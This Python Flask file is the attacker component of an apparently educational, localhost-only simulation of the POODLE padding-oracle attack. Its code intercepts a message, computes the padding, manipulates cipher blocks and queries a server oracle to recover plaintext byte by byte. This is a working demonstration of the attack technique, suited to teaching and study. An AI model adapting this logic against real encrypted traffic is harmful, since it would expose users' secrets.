"""
This is the attacker where the core logic of the POODLE attack
is present.
"""

# http communication pacakges
from flask import Flask, request
import requests
import binascii
# Logging packages
import logging
import re

attacker = Flask(__name__)

# Initialization of the client and the server
CLIENT_PORT = 3001
SERVER_PORT = 3000

BASE_URL = f'http://127.0.0.1:{CLIENT_PORT}/'
SERVER_URL = f'http://127.0.0.1:{SERVER_PORT}/'

# initialization of the URLs
original_len = None
length = None
save = None
block = None
t = 1
secret_block = []
secret = []


@attacker.route("/")
def base():
    # Base url, does nothing in this case.
    return "<p>This is the attacker!</p>"


@attacker.route('/intercept')
def intercepted_message():
    """
    Gets the intercepted messages from the client to the server.
    It stores the original length and initiates finding the number of padding
    bytes required for getting a new block of padding.
    """
    global original_len
    global length
    msg = request.args.get('msg')
    msg = msg.encode()
    original_len = len(msg)
    print("Intercepted Message : ", msg)
    print('Original Length : ', original_len)
    print('Finding pad block...', end=" ")
    # Starts finding the padding block.
    decrypted_msg = send(end_url='attack_pad_block').text
    print("intercept:", decrypted_msg)
    return decrypted_msg


@attacker.route('/pad_block')
def pad_block():
    global original_len
    global length
    global save
    global t
    msg = request.args.get('msg')
    msg = bytearray.fromhex(msg)
    length = len(msg.hex().encode())
    if original_len < length:
    # Length of the new cipher text has increased by one block size
    # This means that t is the number of padded bytes!
        print(t)
        save = t
        plaintext = send(end_url="poodle_attack").text
        print("pad_block:", plaintext)
        return plaintext
    t = t + 1
    temp = send(pad_before='a'*t, end_url='attack_pad_block').text
    return temp


def split_len(seq, length):
# This function splits the data into chunks of length (32) in our case.
    t = [seq[i:i+length] for i in range(0, len(seq), length)]
    return t


@attacker.route('/poodle_attack')
def poodle_attack():
    """
    This is the main URL for the poodle attack. The leaking of the bytes takes place from here.
    It also does the communication between client and the server to make client send the padded/
    deviated request to the server.
    """
    secret_block = []
    secret = []
    global original_len
    global t # Gives the number of padded characters
    global save
    original_length = original_len
    length_block = 16
    print('Starting poodle attack...')
    for block in range(original_length//32-2, 0,-1):
        # Starts finding the blocks
        print('Starting block : ', block)
        for char in range(length_block):
            # Finds the characters in each block
            # count = 0
            while True:
                # Adds the initial and extended padding so that it can push each character into last block of padding.
                garbage_padding = "$"*16 +"#"*t
                end_padding = "%"*(block*length_block - char)
                resp = send(pad_before=garbage_padding, pad_after=end_padding, end_url='poodle_request')
                cipher = resp.text.encode()
                req = split_len(cipher, 32)
                # print("req:", req)
                req[-1] = req[block]
                cipher = binascii.unhexlify(b''.join(req).decode())
                plain = send_server(cipher.hex())
                # count += 1
                if plain != "1":
                    t += 1
                    # Get the 2nd last block
                    prev_block = req[-2]
                    # for the previous cipher text that needs to be xored
                    prev_cipher_block = req[block - 1]
                    decipher_byte = chr(int("0f",16) ^ int(prev_block[-2:],16) ^ int(prev_cipher_block[-2:],16))
                    secret_block.append(decipher_byte)
                    actual = 15 - char
                    # print(f"Accepted! [{block}]\t[{actual}]\ttries\t:\t", count)
                    print(f"Accepted! [{block}]\t[{actual}]")
                    break  
        secret_block = secret_block[::-1]
        secret.append(('').join(secret_block))
        print(secret_block)
        secret_block = []
        t = save

    secret = secret[::-1]
    plaintext = re.sub('^#+','',('').join(secret))

    print("Prining plaintext: \n")

    if type(plaintext) == str :
        print("-"*20)
        print('plaintext : ', plaintext)
        return plaintext
    else:
        print('Nothing to display')
        return "No Secret to display"
    

def send_server(cipher):
    # Sends the requests to the server
    resp = requests.get(SERVER_URL+'get_message', params = {'msg' : cipher}).text
    return resp


def send(pad_before="-1", pad_after="-1", end_url=""):
    # Sends the request to the client to add the padding before and after
    url = (BASE_URL+end_url)
    resp = requests.get(url, params = {'pad_before' : pad_before, 'pad_after': pad_after})
    return resp


if __name__ == '__main__':
    print('Initialising Attacker')
    attacker.logger.disabled = True
    log = logging.getLogger('werkzeug')
    log.disabled = True
    attacker.run(port=3002)